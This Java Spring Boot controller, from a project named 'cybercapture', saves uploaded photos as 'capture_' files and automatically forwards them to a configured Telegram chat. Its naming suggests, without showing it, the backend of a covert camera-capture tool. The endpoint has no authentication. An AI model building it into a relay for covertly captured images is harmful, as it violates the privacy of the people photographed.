package com.cybercapture.demo.controller;

import org.springframework.beans.factory.annotation.Value;
import org.springframework.http.ResponseEntity;
import org.springframework.util.LinkedMultiValueMap;
import org.springframework.util.MultiValueMap;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.RestController;
import org.springframework.web.client.RestTemplate;
import org.springframework.web.multipart.MultipartFile;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.time.Instant;

@RestController
public class UploadController {

    @Value("${telegram.bot.token:}")
    private String botToken;

    @Value("${telegram.chat.id:}")
    private String chatId;

    // Save uploaded file locally and forward to Telegram (if token set)
    @PostMapping("/upload")
    public ResponseEntity<String> handleUpload(@RequestParam("photo") MultipartFile photo) throws IOException {
        if (photo == null || photo.isEmpty()) {
            return ResponseEntity.badRequest().body("{\"error\":\"File kosong\"}");
        }

        // ensure uploads dir exists
        File uploads = new File("uploads");
        if (!uploads.exists()) uploads.mkdirs();

        // save file locally with timestamp
        String filename = "capture_" + Instant.now().getEpochSecond() + ".jpg";
        File outFile = new File(uploads, filename);
        try (FileOutputStream fos = new FileOutputStream(outFile)) {
            fos.write(photo.getBytes());
        }

        // if telegram token is provided, forward the photo
        if (botToken != null && !botToken.isBlank() && chatId != null && !chatId.isBlank()) {
            try {
                String telegramUrl = "https://api.telegram.org/bot" + botToken + "/sendPhoto";
                RestTemplate rest = new RestTemplate();
                MultiValueMap<String, Object> body = new LinkedMultiValueMap<>();
                body.add("chat_id", chatId);
                body.add("caption", "Foto otomatis terkirim");
                body.add("photo", new org.springframework.core.io.ByteArrayResource(photo.getBytes()) {
                    @Override public String getFilename() { return filename; }
                });
                rest.postForEntity(telegramUrl, body, String.class);
            } catch (Exception ex) {
                ex.printStackTrace();
                // ignore telegram error but return success for local save
                return ResponseEntity.ok("{\"message\":\"Tersimpan lokal, tapi gagal kirim ke Telegram: " + ex.getMessage() + "\"}");
            }
        }

        return ResponseEntity.ok("{\"message\":\"Tersimpan dan (jika tersedia) diteruskan ke Telegram\"}");
    }
  }
          
